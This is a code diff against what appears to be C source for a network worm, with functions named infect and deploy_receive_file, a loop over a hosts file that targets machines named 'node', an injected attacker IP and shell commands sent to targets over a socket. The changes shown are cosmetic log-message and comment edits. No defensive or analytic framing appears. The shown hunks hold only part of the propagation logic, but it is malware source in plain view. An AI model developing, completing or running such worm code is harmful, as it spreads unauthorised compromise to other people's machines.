@@ -29,7 +29,7 @@ void deploy_receive_file(sock)
         }
         fclose(fp);
     }
-    // printf("[DEBUG] Injected IP will be: [%s]\n", local_ip);
+    /* printf("[DEBUG] Injected IP will be: [%s]\n", local_ip); */
 
     formatted_source = (char *)malloc(10000); 
     if (formatted_source == (char *)0) return;
@@ -77,7 +77,7 @@ void infect(ip)
     bzero(buf, BUF_SIZE);
     bzero(io_buf, IO_BUF_SIZE);
 
-    printf("[*] Attempting to infect: %s\n", ip);
+    printf("[*] Starting infection for: %s\n", ip);
     fflush(stdout);
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -125,7 +125,7 @@ void infect(ip)
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
     printf("[*] Checking /tmp contents on target\n");
-    write_to_sock(sock, "ls -l /tmp/worm_bsd*\n");
+    write_to_sock(sock, "ls -l /tmp\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
@@ -161,7 +161,7 @@ int main()
         }
         fclose(fp);
     }
-    printf("[*] Attacker IP is %s. Starting infection.\n", my_ip);
+    printf("[*] Attacker IP is %s. Scanning for targets.\n", my_ip);
 
     while (1) {
         fp = fopen(HOSTS_FILE, "r");
@@ -189,7 +189,7 @@ int main()
             if (strncmp(current_hostname, "node", 4) == 0) {
                 
                 /* SUCCESS: 'ip' now holds the address of a node. */
-                 printf("IP for %s found: %s\n", current_hostname, ip);
+                 printf("[*] IP for %s found: %s\n", current_hostname, ip);
             }
         }
 
